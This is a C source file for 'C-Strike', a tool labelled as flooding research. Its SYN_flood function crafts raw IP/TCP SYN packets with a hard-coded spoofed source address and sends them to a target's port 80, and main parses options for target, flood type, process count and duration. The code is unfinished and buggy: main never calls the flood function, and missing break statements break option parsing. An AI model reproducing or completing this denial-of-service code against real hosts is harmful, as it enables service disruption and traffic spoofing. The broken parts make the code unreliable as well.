//C-Strike: a security research for flooding
//Copyright (C) 2025  Jan Kałucki
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include "C-Strike.h"

int opts;
extern int optind;
extern char* optarg;
unsigned int n_proc=4;
unsigned int duration=10;
unsigned int pkt_len =1000;
char* target = "127.0.0.1";
char* type ="UDP flooding";

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

int SYN_flood(char* target,unsigned int n_proc,unsigned int msg_len){
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in dest;

    dest.sin_family = AF_INET;
    dest.sin_port = htons(80);
    dest.sin_addr.s_addr = inet_addr(target);

    // Fill in IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.2");
    iph->daddr = dest.sin_addr.s_addr;

    iph->check = checksum((unsigned short *) datagram, iph->tot_len);

    // Fill in TCP Header
    tcph->source = htons(12345);
    tcph->dest = htons(80);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Pseudo header for checksum
    struct pseudo_header psh;
    psh.source_address = inet_addr("192.168.1.2");
    psh.dest_address = dest.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
    memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
    memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

    tcph->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));

    if (sendto(sock, datagram, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("Send failed");
    } else {
        printf("SYN packet sent\n");
    }

    close(sock);
    return 0;
}

int main(int argc, char** argv){
	//Target;type;n_proc;duration;packet_len
	while((opts = getopt(argc,argv,"T:t:n:d:l:"))!= EOF){
		switch(opts){
			case 'T':
				target = optarg;
			break;
			case 't':
				type = optarg;
			break;
			case 'n':
				n_proc = (unsigned int)(atoi(optarg));
			break;
			case 'd':
				duration = (unsigned int)(atoi(optarg));
			case 'l':
				pkt_len = (unsigned int)(atoi(optarg));
			case '?':
				fprintf(stderr,
				"Usage: C-Strike [-T target] [-t type] [-n n_processes] [-d duration] [-l packet length]");
				return 1;
			break;
		
		}
	}
	printf("target:%s,type:%s,n_proc:%d,duration:%d,pkt_len:%d",
		target, type, n_proc, duration, pkt_len);
	return 0;
}
